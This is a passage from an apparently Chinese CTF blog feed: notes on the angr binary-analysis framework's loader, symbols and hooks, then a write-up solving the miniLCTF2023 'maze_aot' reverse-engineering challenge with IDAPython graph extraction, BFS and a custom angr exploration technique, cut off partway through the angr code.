Objects</h3><p>前面提到Angr使用CLE来装载二进制文件，而CLE装载器即<code>cle.Loader</code>装载了这个二进制文件的所有objects，并且把他们映射到一个内存地址。每一个不同类型的binary objec都可以由<code>cle.Backend</code>处理，比如<code>cle.ELF</code>就是用来装载ELF文件。</p><h4 id="loader-all-objects"><a href="#loader-all-objects" class="headerlink" title="loader.all_objects"></a>loader.all_objects</h4><p>可以通过<code>loader.all_objects</code>来获得CLE装载所有objects的列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># All loaded objects</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.all_objects<br>[&lt;ELF Object fauxware, maps [<span class="hljs-number">0x400000</span>:<span class="hljs-number">0x60105f</span>]&gt;,<br> &lt;ELF Object libc-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x1000000</span>:<span class="hljs-number">0x13c999f</span>]&gt;,<br> &lt;ELF Object ld-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x2000000</span>:<span class="hljs-number">0x2227167</span>]&gt;,<br> &lt;ELFTLSObject Object cle<span class="hljs-comment">##tls, maps [0x3000000:0x3015010]&gt;,</span><br> &lt;ExternObject Object cle<span class="hljs-comment">##externs, maps [0x4000000:0x4008000]&gt;,</span><br> &lt;KernelObject Object cle<span class="hljs-comment">##kernel, maps [0x5000000:0x5008000]&gt;]</span><br><br><span class="hljs-comment"># main object 也就是需要我们关注的那个object</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object<br>&lt;ELF Object fauxware, maps [<span class="hljs-number">0x400000</span>:<span class="hljs-number">0x60105f</span>]&gt;<br><br><span class="hljs-comment"># 从名字到地址的映射</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.shared_objects<br>&#123; <span class="hljs-string">&#x27;fauxware&#x27;</span>: &lt;ELF Object fauxware, maps [<span class="hljs-number">0x400000</span>:<span class="hljs-number">0x60105f</span>]&gt;,<br>  <span class="hljs-string">&#x27;libc.so.6&#x27;</span>: &lt;ELF Object libc-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x1000000</span>:<span class="hljs-number">0x13c999f</span>]&gt;,<br>  <span class="hljs-string">&#x27;ld-linux-x86-64.so.2&#x27;</span>: &lt;ELF Object ld-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x2000000</span>:<span class="hljs-number">0x2227167</span>]&gt; &#125;<br><br><span class="hljs-comment"># 从ELF装载的所有文件</span><br><span class="hljs-comment"># 如果是PE程序 使用all_pe_objects</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.all_elf_objects<br>[&lt;ELF Object fauxware, maps [<span class="hljs-number">0x400000</span>:<span class="hljs-number">0x60105f</span>]&gt;,<br> &lt;ELF Object libc-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x1000000</span>:<span class="hljs-number">0x13c999f</span>]&gt;,<br> &lt;ELF Object ld-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x2000000</span>:<span class="hljs-number">0x2227167</span>]&gt;]<br><br><span class="hljs-comment"># 处理外部导入</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.extern_object<br>&lt;ExternObject Object cle<span class="hljs-comment">##externs, maps [0x4000000:0x4008000]&gt;</span><br><br><span class="hljs-comment"># 此object提供系统调用地址</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.kernel_object<br>&lt;KernelObject Object cle<span class="hljs-comment">##kernel, maps [0x5000000:0x5008000]&gt;</span><br><br><span class="hljs-comment"># 通过地址找object</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.find_object_containing(<span class="hljs-number">0x400000</span>)<br>&lt;ELF Object fauxware, maps [<span class="hljs-number">0x400000</span>:<span class="hljs-number">0x60105f</span>]&gt;<br></code></pre></td></tr></table></figure><h4 id="与object交互"><a href="#与object交互" class="headerlink" title="与object交互"></a>与object交互</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python">obj = proj.loader.main_object<br><br><span class="hljs-comment"># 入口点</span><br>obj.entry<br><span class="hljs-number">0x400580</span><br><br><span class="hljs-comment"># 起始 终止</span><br>obj.min_addr, obj.max_addr<br>(<span class="hljs-number">0x400000</span>, <span class="hljs-number">0x60105f</span>)<br><br><span class="hljs-comment"># segments</span><br>obj.segments<br>&lt;Regions: [&lt;ELFSegment memsize=<span class="hljs-number">0xa74</span>, filesize=<span class="hljs-number">0xa74</span>, vaddr=<span class="hljs-number">0x400000</span>, flags=<span class="hljs-number">0x5</span>, offset=<span class="hljs-number">0x0</span>&gt;,<br>           &lt;ELFSegment memsize=<span class="hljs-number">0x238</span>, filesize=<span class="hljs-number">0x228</span>, vaddr=<span class="hljs-number">0x600e28</span>, flags=<span class="hljs-number">0x6</span>, offset=<span class="hljs-number">0xe28</span>&gt;]&gt;<br><span class="hljs-comment"># sections</span><br>obj.sections<br>&lt;Regions: [&lt;Unnamed | offset <span class="hljs-number">0x0</span>, vaddr <span class="hljs-number">0x0</span>, size <span class="hljs-number">0x0</span>&gt;,<br>           &lt;.interp | offset <span class="hljs-number">0x238</span>, vaddr <span class="hljs-number">0x400238</span>, size <span class="hljs-number">0x1c</span>&gt;,<br>           &lt;.note.ABI-tag | offset <span class="hljs-number">0x254</span>, vaddr <span class="hljs-number">0x400254</span>, size <span class="hljs-number">0x20</span>&gt;,<br>            ...etc<br><br><span class="hljs-comment"># 利用地址去找segment 或者 section</span><br>obj.find_segment_containing(obj.entry)<br>&lt;ELFSegment memsize=<span class="hljs-number">0xa74</span>, filesize=<span class="hljs-number">0xa74</span>, vaddr=<span class="hljs-number">0x400000</span>, flags=<span class="hljs-number">0x5</span>, offset=<span class="hljs-number">0x0</span>&gt;<br>obj.find_section_containing(obj.entry)<br>&lt;.text | offset <span class="hljs-number">0x580</span>, vaddr <span class="hljs-number">0x400580</span>, size <span class="hljs-number">0x338</span>&gt;<br><br><span class="hljs-comment"># plt表找符号</span><br>addr = obj.plt[<span class="hljs-string">&#x27;strcmp&#x27;</span>]<br>addr<br><span class="hljs-number">0x400550</span><br>obj.reverse_plt[addr]<br><span class="hljs-string">&#x27;strcmp&#x27;</span><br><br><span class="hljs-comment"># Show the prelinked base of the object and the location it was actually mapped into memory by CLE</span><br>obj.linked_base<br><span class="hljs-number">0x400000</span><br>obj.mapped_base<br><span class="hljs-number">0x400000</span><br></code></pre></td></tr></table></figure><h3 id="Symbols-and-Relocations"><a href="#Symbols-and-Relocations" class="headerlink" title="Symbols and Relocations"></a>Symbols and Relocations</h3><p>symbol是可执行文件的重要概念，完成从名字到地址的映射</p><p>可以利用<code>loader.find_symbol</code>寻找特定symbol,它的参数可以是名字，也可以是地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">strcmp = proj.loader.find_symbol(<span class="hljs-string">&#x27;strcmp&#x27;</span>)<br>strcmp<br>&lt;Symbol <span class="hljs-string">&quot;strcmp&quot;</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> at <span class="hljs-number">0x1089cd0</span>&gt;<br></code></pre></td></tr></table></figure><p>symbol有三种形式地址</p><p><code>.rebased_addr</code> 是全局地址空间的地址</p><p><code>.linked_addr</code> 预链接地址</p><p><code>.relative_addr</code> 即RVA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">strcmp.name<br><span class="hljs-string">&#x27;strcmp&#x27;</span><br><br>strcmp.owner<br>&lt;ELF Object libc-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x1000000</span>:<span class="hljs-number">0x13c999f</span>]&gt;<br><br>strcmp.rebased_addr<br><span class="hljs-number">0x1089cd0</span><br>strcmp.linked_addr<br><span class="hljs-number">0x89cd0</span><br>strcmp.relative_addr<br><span class="hljs-number">0x89cd0</span><br></code></pre></td></tr></table></figure><h2 id="Loading-Options"><a href="#Loading-Options" class="headerlink" title="Loading Options"></a>Loading Options</h2><p>可以给angr.Project传一些参数，以此来约束加载二进制文件的行为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span>auto_load_libs  决定是否加载动态链接库，默认开启<br><span class="hljs-number">2.</span>skip_libs       跳过这些依赖库<br><span class="hljs-number">3.</span>ld_path         寻找动态链接库的路径<br><span class="hljs-number">4.</span>backend         后端，比如 blob<br><span class="hljs-number">5.</span>base_addr       基址<br><span class="hljs-number">6.</span>entry_point     入口点<br><span class="hljs-number">7.</span>arch            架构<br></code></pre></td></tr></table></figure><h3 id="Symbolic-Function-Summaries"><a href="#Symbolic-Function-Summaries" class="headerlink" title="Symbolic Function Summaries"></a>Symbolic Function Summaries</h3><p>Project会将外部的call转化为自己的符号执行，angr已经把一整套的外部库函数给模拟为SimProcedures了，</p><p>可以在<code>angr.SIM_PROCEDURES</code>字典访问，键值是库的名字，对象是这个库的函数名字</p><p>如果没有这个外部函数的SimProcedueres:</p><p><code>auto_load_libs</code> is <code>True</code> (default), 执行原来的函数</p><p><code>auto_load_libs</code> is <code>False</code>, 也是模拟执行，但返回一个无约束的状态</p><p><code>use_sim_procedures</code>，这个是<code>angr.Project</code>的参数，如果是False，只会模拟执行此symbols.默认是True</p><p>Hook</p><p><code>proj.hook(addr, hook)</code>, where <code>hook</code> is a SimProcedure instance. You can manage your project’s hooks with <code>.is_hooked</code>, <code>.unhook</code>, and <code>.hooked_by</code>, which should hopefully not require explanation.</p><p>可以指定length参数，来决定hook后跳多少个bytes指令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">stub_func = angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;stubs&#x27;</span>][<span class="hljs-string">&#x27;ReturnUnconstrained&#x27;</span>] <span class="hljs-comment"># this is a CLASS</span><br>proj.hook(<span class="hljs-number">0x10000</span>, stub_func())  <span class="hljs-comment"># hook with an instance of the class</span><br><br>proj.is_hooked(<span class="hljs-number">0x10000</span>)            <span class="hljs-comment"># these functions should be pretty self-explanitory</span><br><span class="hljs-literal">True</span><br>proj.hooked_by(<span class="hljs-number">0x10000</span>)<br>&lt;ReturnUnconstrained&gt;<br><br>proj.unhook(<span class="hljs-number">0x10000</span>)<br><br><span class="hljs-meta">@proj.hook(<span class="hljs-params"><span class="hljs-number">0x20000</span>, length=<span class="hljs-number">5</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook</span>(<span class="hljs-params">state</span>):<br>    state.regs.rax = <span class="hljs-number">1</span><br><br>proj.is_hooked(<span class="hljs-number">0x20000</span>)<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>angr这样描述hook</p><blockquote><p>Furthermore, you can use <code>proj.hook_symbol(name, hook)</code>, providing the name of a symbol as the first argument, to hook the address where the symbol lives. One very important usage of this is to extend the behavior of angr’s built-in library SimProcedures. Since these library functions are just classes, you can subclass them, overriding pieces of their behavior, and then use your subclass in a hook.</p></blockquote><p>也即我们可以用<code>proj.hook_symbol(name,hook)</code>来替换angr内置的函数，以我们的方式实现</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>angr</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>miniLCTF2023 maze_aot</title>
    <link href="/2023/05/25/miniLCTF2023%20maze_aot/"/>
    <url>/2023/05/25/miniLCTF2023%20maze_aot/</url>
    
    <content type="html"><![CDATA[<p>一道题学会angr和IDApython,甚至BFS（：</p><span id="more"></span><p>题目流程很简单，输入一个8个十六进制数，依次根据最低位选择一条路径走，走到会终点即可得到flag</p><p>这里是<a href="https://github.com/XDSEC/miniLCTF_2023/tree/main/Challenges/maze_aot">题目</a></p><h2 id="IDApython"><a href="#IDApython" class="headerlink" title="IDApython"></a>IDApython</h2><p>观察迷宫的流程图，会发现是很有规律的，每一个block都有两个successor，根据输入决定前往哪一个successor。还要注意一点，就是会有直接jmp块，需要做个小处理。通过IDApython 提取处迷宫的结构，再用BFS算法去走即可。</p><h3 id="提取迷宫"><a href="#提取迷宫" class="headerlink" title="提取迷宫"></a>提取迷宫</h3><p>大致分为三部分，第一部分是计算每个block的successor，存储为字典形式，这里不区分是普通跳转还是直接jmp跳转</p><p>第二部分是记录直接跳转块</p><p>第三部分是计算普通跳转是通过什么方式去跳，即是jz还是jnz，也是存储为字典形式</p><p>note：在提取迷宫的时候，最好将地址全部转为十进制的整型，否则后面比较会有各种问题（在这卡了好久）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python">start_ea = <span class="hljs-number">0x1500</span><br>end_ea = <span class="hljs-number">0x23D9</span><br><br>func = idaapi.get_func(start_ea)<br>cfg = idaapi.FlowChart(func)<br><br>Maze = <span class="hljs-built_in">dict</span>()<br>JmpMethod = <span class="hljs-built_in">dict</span>()<br>DirJmp = <span class="hljs-built_in">list</span>()<br><span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> cfg:<br>    BlockStart = block.start_ea<br>    BlockEnd = block.end_ea<br>    <br>    <span class="hljs-comment"># 初始化一下</span><br>    Maze[BlockStart] = <span class="hljs-built_in">list</span>()<br><br>    <span class="hljs-comment"># 记录每一个块可以去哪</span><br>    <span class="hljs-keyword">for</span> succ <span class="hljs-keyword">in</span> block.succs():<br>        <span class="hljs-comment"># 如果不是直接跳转块，那么直接获取successor的起始地址</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> GetDisasm(succ.start_ea).startswith(<span class="hljs-string">&#x27;jmp&#x27;</span>):<br>            Maze[BlockStart].append(succ.start_ea)<br>        <span class="hljs-comment"># 如果是直接跳转块 那么就获取该汇编语句jmp的地址，并将字符型地址转为整数型存储</span><br>        <span class="hljs-keyword">else</span>:<br>            Maze[BlockStart].append(<span class="hljs-built_in">int</span>(GetDisasm(succ.start_ea)[-<span class="hljs-number">4</span>::],base=<span class="hljs-number">16</span>))<br>    <br>    <span class="hljs-comment"># 记录直接跳转块</span><br>    <span class="hljs-keyword">if</span> GetDisasm(BlockStart).startswith(<span class="hljs-string">&#x27;jmp&#x27;</span>):<br>        DirJmp.append(BlockStart)<br>        <br>    <span class="hljs-comment"># 记录普通跳转块</span><br>    <span class="hljs-keyword">elif</span> BlockStart!=start_ea <span class="hljs-keyword">and</span> BlockStart!=end_ea:<span class="hljs-comment">#这两个不等号是用来掐头去尾，否则下面Dst转化就会有问题</span><br>        JmpMethod[BlockStart] = <span class="hljs-built_in">list</span>()<br>        <span class="hljs-comment">#  这里有一个细节 就是一个block的结束地址 并不是这个block最后一条语句的地址 而是它successor的起始地址</span><br>        <span class="hljs-comment">#  所以这里就获取结束地址的前一条语句 来得到block的最后一条语句</span><br>        <span class="hljs-comment">#  prev_head功能是获取前一条语句 print_insn_mnem是获取操作指令</span><br>        Dst = <span class="hljs-built_in">int</span>(GetDisasm(prev_head(BlockEnd))[-<span class="hljs-number">4</span>::],base=<span class="hljs-number">16</span>)<br>        JmpMethod[BlockStart].append(print_insn_mnem(prev_head(BlockEnd)))<br>        JmpMethod[BlockStart].append(Dst)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Maze:&quot;</span>)<br><span class="hljs-built_in">print</span>(Maze)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;***************************************************************&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;DirJmp:&quot;</span>)<br><span class="hljs-built_in">print</span>(DirJmp)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;***************************************************************&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;JmpMethod:&quot;</span>)<br><span class="hljs-built_in">print</span>(JmpMethod)<br>    <br></code></pre></td></tr></table></figure><h3 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h3><p>得到迷宫后，就可以用BFS走，DFS应该是走不出来的，因为可能有环的存在。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 接上文一起</span><br><span class="hljs-keyword">import</span> queue<br><br>start = <span class="hljs-number">0x1500</span><br>end = <span class="hljs-number">0x23d9</span><br>q = queue.Queue()<br>q.put(<span class="hljs-number">0x1500</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">maze_walk</span>():<br>    visited = <span class="hljs-built_in">set</span>()<br>    father = &#123;<span class="hljs-number">0x1500</span>: <span class="hljs-literal">None</span>&#125; <span class="hljs-comment">#用于回溯</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> q.empty():<br>        curr = q.get() <span class="hljs-comment"># 取的同时也会弹出</span><br>        nxs = Maze[curr]<br>        <span class="hljs-keyword">for</span> dirc <span class="hljs-keyword">in</span> nxs:<br>            <span class="hljs-keyword">if</span> dirc <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>                visited.add(dirc)<br>                father[dirc] = curr<br>                q.put(dirc)<br><br>            <span class="hljs-keyword">if</span> dirc == end:<br>                p = [dirc]<br>                <span class="hljs-keyword">while</span> father[dirc] <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    dirc = father[dirc]<br>                    p.append(dirc)<br><br>                <span class="hljs-keyword">return</span> p[::-<span class="hljs-number">1</span>] <span class="hljs-comment"># 反转得到由起点-&gt;终点路径</span><br><br><br>path = maze_walk()<br>p = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> path:<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> DirJmp: <span class="hljs-comment">#如果是jmp跳 那么不理他 下一个</span><br>        p.append(i)<br>p = p[<span class="hljs-number">1</span>:] <span class="hljs-comment">#除去第一个点即0x1500</span><br><br><br>ans = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(p) - <span class="hljs-number">1</span>): <span class="hljs-comment"># 终点不算</span><br>    <span class="hljs-keyword">if</span> JmpMethod[p[i]][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;jnz&#x27;</span> <span class="hljs-keyword">and</span> JmpMethod[p[i]][<span class="hljs-number">1</span>] == p[i + <span class="hljs-number">1</span>]:<br>        ans += <span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> JmpMethod[p[i]][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;jz&#x27;</span> <span class="hljs-keyword">and</span> JmpMethod[p[i]][<span class="hljs-number">1</span>] == p[i + <span class="hljs-number">1</span>]:<br>        ans += <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">if</span> JmpMethod[p[i]][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;jnz&#x27;</span> <span class="hljs-keyword">and</span> JmpMethod[p[i]][<span class="hljs-number">1</span>] != p[i + <span class="hljs-number">1</span>]:<br>        ans += <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">if</span> JmpMethod[p[i]][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;jz&#x27;</span> <span class="hljs-keyword">and</span> JmpMethod[p[i]][<span class="hljs-number">1</span>] != p[i + <span class="hljs-number">1</span>]:<br>        ans += <span class="hljs-string">&#x27;1&#x27;</span><br><br><span class="hljs-comment"># 再反转得到 因为迷宫从输入的最低位开始走的，所以最右边才是起始</span><br>ans = <span class="hljs-built_in">int</span>(ans[::-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ans))<br><span class="hljs-comment">#  893bddd9aa12789e</span><br></code></pre></td></tr></table></figure><h2 id="Angr"><a href="#Angr" class="headerlink" title="Angr"></a>Angr</h2><p>主要思路就是模拟迷宫的走法，自定义一个ExplorationTechnique,避免路径爆炸的问题，毕竟 2^64次方还是很大的，里面的各种技术细节可以参考下之前的文章（就是因为这题，才写了这些文章 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> angr <span class="hljs-keyword">import</span> SimState<br><span class="hljs-comment"># 继承ExplorationTechnique类，并重载一些方法</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Walk</span>(angr.ExplorationTechnique):<br>    <span class="hljs-string">&quot;&quot;&quot;大体思路就是BFS&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,MazeRange:<span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">int</span> ,<span class="hljs-built_in">int</span>],MazeFinal:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        MazeRange:整个迷宫范围，也就是起始地址到结束地址，注意是整个迷宫，不是起始到终点的范围</span><br><span class="hljs-string">        MazeFinal:迷宫终点</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        self._MazeRange = MazeRange<br>        self._MazeFinal = MazeFinal<br>        self._Vistited = <span class="hljs-built_in">set</span>() <span class="hljs-comment">#用于判断是否访问过</span><br>       <br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">self,simgr:angr.SimulationManager</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        定义并初始化两个stash</span><br><span class="hljs-string">        初始化_Vistited</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        simgr.stashes[<span class="hljs-string">&#x27;visited&#x27;</span>] =[]<br>        simgr.stashes[<span class="hljs-string">&#x27;found&#x27;</span>] =[]<br>        self._Vistited.add(simgr.active[<span class="hljs-number">0</span>].addr)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">isInMaze</span>(<span class="hljs-params">self,state:angr.SimState</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>        <span class="hljs-keyword">return</span> self._MazeRange[<span class="hljs-number">0</span>] &lt;= state.addr &lt; self._MazeRange[<span class="hljs-number">1</span>]<br>    <br>  <br>    <span class="hljs-keyword">def</span> <span 